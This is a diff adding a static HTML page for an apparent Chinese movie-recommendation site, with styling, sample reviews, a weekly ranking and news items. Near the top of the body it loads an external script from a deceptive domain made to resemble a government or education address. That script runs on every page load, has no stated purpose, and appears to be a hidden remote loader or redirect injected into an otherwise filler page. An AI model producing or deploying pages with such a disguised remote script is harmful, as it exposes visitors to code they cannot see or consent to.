@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>奇米电影网 - 热门电影推荐、分类导航与影视资讯</title>
+<meta name="description" content="奇米电影网提供热门电影推荐、电影分类、排行榜、影视资讯与影评内容，覆盖动作、爱情、科幻、悬疑等类型，适合影迷快速找片。">
+<meta name="keywords" content="奇米电影网,热门电影,电影分类,电影排行榜,影视资讯">
+<link rel="canonical" href="https://qimidianyingwang-h5.github.io/">
+
+<style>
+:root{
+  --ink:#111418;
+  --paper:#f7f5f0;
+  --card:#ffffff;
+  --line:#e3ddd2;
+  --red:#e02323;
+  --gold:#caa24a;
+  --muted:#6b7280;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{
+  background:var(--paper);
+  color:var(--ink);
+  font-family:"PingFang SC","Microsoft YaHei",-apple-system,Segoe UI,Roboto,Arial,sans-serif;
+  line-height:1.7;
+}
+a{color:inherit;text-decoration:none}
+
+/* 刊头 */
+.masthead{
+  border-bottom:3px double var(--ink);
+  padding:18px 16px 10px;
+  max-width:1180px;margin:0 auto;
+}
+.kicker{
+  font-size:12px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;
+}
+.masthead h1{
+  font-size:38px;line-height:1.1;margin:6px 0 4px;font-weight:900;letter-spacing:1px;
+}
+.masthead h1 b{color:var(--red)}
+.dateline{
+  display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px;
+  font-size:13px;color:var(--muted);border-top:1px solid var(--line);padding-top:8px;
+}
+
+/* 导航 */
+.catnav{
+  max-width:1180px;margin:0 auto;padding:10px 16px;
+  display:flex;gap:10px;flex-wrap:wrap;border-bottom:1px solid var(--line);
+}
+.catnav a{
+  font-size:14px;padding:6px 12px;background:#fff;border:1px solid var(--line);border-radius:999px;
+}
+.catnav a:hover{border-color:var(--red);color:var(--red)}
+
+/* 布局 */
+.wrap{
+  max-width:1180px;margin:22px auto;padding:0 16px;
+  display:grid;grid-template-columns:1fr 320px;gap:22px;
+}
+
+/* 主列 */
+.lead{
+  display:grid;grid-template-columns:1.4fr 1fr;gap:16px;margin-bottom:26px;
+}
+.lead-main{
+  background:var(--card);border:1px solid var(--line);border-radius:14px;overflow:hidden;
+}
+.lead-main .cover{
+  height:220px;background:linear-gradient(135deg,#2b2b3a,#7a2230);
+}
+.lead-main .body{padding:16px}
+.tag{font-size:12px;color:var(--red);font-weight:700;letter-spacing:1px}
+.lead-main h2{font-size:24px;margin:6px 0}
+.lead-sub article{
+  background:var(--card);border:1px solid var(--line);border-radius:12px;padding:14px;margin-bottom:14px;
+}
+.lead-sub h3{font-size:17px;margin-bottom:6px}
+.lead-sub p{font-size:14px;color:var(--muted)}
+
+/* 海报墙 */
+.section-title{
+  display:flex;align-items:center;gap:10px;margin:26px 0 14px;
+}
+.section-title h2{font-size:22px}
+.section-title::after{content:"";flex:1;height:2px;background:var(--ink)}
+
+.poster-grid{
+  display:grid;grid-template-columns:repeat(4,1fr);gap:14px;
+}
+.poster{
+  background:var(--card);border:1px solid var(--line);border-radius:12px;overflow:hidden;
+}
+.poster .img{height:160px;background:linear-gradient(135deg,#344,#557)}
+.poster:nth-child(2) .img{background:linear-gradient(135deg,#5a2,#277)}
+.poster:nth-child(3) .img{background:linear-gradient(135deg,#a33,#f90)}
+.poster:nth-child(4) .img{background:linear-gradient(135deg,#369,#936)}
+.poster .info{padding:10px}
+.poster h3{font-size:15px}
+.poster span{font-size:12px;color:var(--muted)}
+
+/* 侧栏 */
+.side .box{
+  background:var(--card);border:1px solid var(--line);border-radius:14px;padding:16px;margin-bottom:18px;
+}
+.side h2{font-size:18px;margin-bottom:12px;border-left:4px solid var(--gold);padding-left:8px}
+.rank{
+  display:flex;align-items:center;gap:10px;padding:10px 0;border-bottom:1px dashed var(--line);
+}
+.rank:last-child{border-bottom:0}
+.rank b{font-size:18px;color:var(--red);width:24px;text-align:center}
+.rank a{font-size:15px}
+.rank small{display:block;color:var(--muted);font-size:12px}
+
+.news-item{padding:10px 0;border-bottom:1px dashed var(--line)}
+.news-item:last-child{border-bottom:0}
+.news-item time{font-size:12px;color:var(--gold)}
+.news-item h3{font-size:15px;margin:3px 0}
+
+/* 关于 */
+.about{
+  max-width:1180px;margin:10px auto 30px;padding:20px 16px;
+  background:#fff;border:1px solid var(--line);border-radius:14px;
+}
+.about p{color:var(--muted)}
+
+footer{
+  border-top:3px double var(--ink);padding:18px 16px;text-align:center;
+  font-size:13px;color:var(--muted);
+}
+
+@media (max-width:980px){
+  .wrap{grid-template-columns:1fr}
+  .lead{grid-template-columns:1fr}
+  .poster-grid{grid-template-columns:repeat(2,1fr)}
+}
+@media (max-width:520px){
+  .masthead h1{font-size:30px}
+  .poster-grid{grid-template-columns:1fr 1fr}
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="masthead">
+  <div class="kicker">MOVIE MAGAZINE · 奇米出品</div>
+  <h1>奇米<b>电影网</b></h1>
+  <div class="dateline">
+    <span>2026年10月07日 · 影迷每日导视</span>
+    <span>https://qimidianyingwang-h5.github.io</span>
+  </div>
+</header>
+
+<nav class="catnav">
+  <a href="#home">首页</a>
+  <a href="#category">电影分类</a>
+  <a href="#rank">排行榜</a>
+  <a href="#news">影视资讯</a>
+  <a href="#about">关于奇米</a>
+</nav>
+
+<div class="wrap">
+
+  <!-- 主内容 -->
+  <main>
+    <section id="home">
+      <div class="lead">
+        <article class="lead-main">
+          <div class="cover"></div>
+          <div class="body">
+            <span class="tag">今日头条</span>
+            <h2><a href="#">《潮汐之城》：一部被低估的东南亚悬疑片</a></h2>
+            <p>从潮湿的港口到破碎的家庭记忆，影片用长镜头把“失踪”拍成了城市病。</p>
+          </div>
+        </article>
+
+        <div class="lead-sub">
+          <article>
+            <h3><a href="#">爱情片回归：慢火、短信与未接来电</a></h3>
+            <p>2026 年爱情片不再喊“永远”，而是讲“还敢不敢再试一次”。</p>
+          </article>
+          <article>
+            <h3><a href="#">科幻小成本，也能拍出宇宙孤独</a></h3>
+            <p>没有爆炸，只有雷达声与一句“你还在吗”。</p>
+          </article>
+          <article>
+            <h3><a href="#">动作片新趋势：文戏比打戏更好看</a></h3>
+            <p>角色动机清晰后，一拳才真正有重量。</p>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <section id="category">
+      <div class="section-title"><h2>电影分类</h2></div>
+      <div class="poster-grid">
+        <article class="poster">
+          <div class="img"></div>
+          <div class="info"><h3><a href="#">动作 / 犯罪</a></h3><span>枪火、追车、江湖规则</span></div>
+        </article>
+        <article class="poster">
+          <div class="img"></div>
+          <div class="info"><h3><a href="#">爱情 / 青春</a></h3><span>暧昧、错过、重逢</span></div>
+        </article>
+        <article class="poster">
+          <div class="img"></div>
+          <div class="info"><h3><a href="#">科幻 / 悬疑</a></h3><span>时间、记忆、身份谜题</span></div>
+        </article>
+        <article class="poster">
+          <div class="img"></div>
+          <div class="info"><h3><a href="#">剧情 / 文艺</a></h3><span>家庭、乡愁、日常史诗</span></div>
+        </article>
+      </div>
+    </section>
+
+    <section id="news">
+      <div class="section-title"><h2>影视资讯</h2></div>
+      <div class="poster-grid">
+        <article class="poster">
+          <div class="img"></div>
+          <div class="info"><h3><a href="#">电影节片单公布</a></h3><span>2026 亚洲新导演单元</span></div>
+        </article>
+        <article class="poster">
+          <div class="img"></div>
+          <div class="info"><h3><a href="#">老片 4K 修复</a></h3><span>胶片颗粒回来了</span></div>
+        </article>
+        <article class="poster">
+          <div class="img"></div>
+          <div class="info"><h3><a href="#">流媒体排播</a></h3><span>周末限时片单</span></div>
+        </article>
+        <article class="poster">
+          <div class="img"></div>
+          <div class="info"><h3><a href="#">影评人圆桌</a></h3><span>“好电影”还重要吗</span></div>
+        </article>
+      </div>
+    </section>
+  </main>
+
+  <!-- 侧栏 -->
+  <aside class="side">
+    <section id="rank" class="box">
+      <h2>本周排行榜</h2>
+      <div class="rank"><b>1</b><a href="#">南海暗潮<small>悬疑 · 9.1</small></a></div>
+      <div class="rank"><b>2</b><a href="#">晚班出租车<small>剧情 · 8.8</small></a></div>
+      <div class="rank"><b>3</b><a href="#">铁皮玫瑰<small>爱情 · 8.6</small></a></div>
+      <div class="rank"><b>4</b><a href="#">卫星之下<small>科幻 · 8.5</small></a></div>
+      <div class="rank"><b>5</b><a href="#">旧城枪声<small>动作 · 8.3</small></a></div>
+    </section>
+
+    <section class="box">
+      <h2>快讯</h2>
+      <div class="news-item">
+        <time>10-07</time>
+        <h3><a href="#">奇米编辑部：十月必看 10 部</a></h3>
+      </div>
+      <div class="news-item">
+        <time>10-06</time>
+        <h3><a href="#">独立电影发行转向流媒体</a></h3>
+      </div>
+      <div class="news-item">
+        <time>10-05</time>
+        <h3><a href="#">影院重启“午夜场”传统</a></h3>
+      </div>
+    </section>
+  </aside>
+
+</div>
+
+<section id="about" class="about">
+  <h2 style="margin-bottom:10px;">关于奇米电影网</h2>
+  <p>
+    奇米电影网（qimidianyingwang-h5）是一个电影导视与资讯类静态站点，
+    做“找片入口 + 分类导航 + 排行榜 + 影视资讯”。不依赖后端，
+    移动端优先，结构清晰，适合必应等搜索引擎抓取与影迷日常浏览。
+  </p>
+</section>
+
+<footer>
+  © 2026 奇米电影网 · https://qimidianyingwang-h5.github.io · 单页静态演示
+</footer>
+
+</body>
+</html>
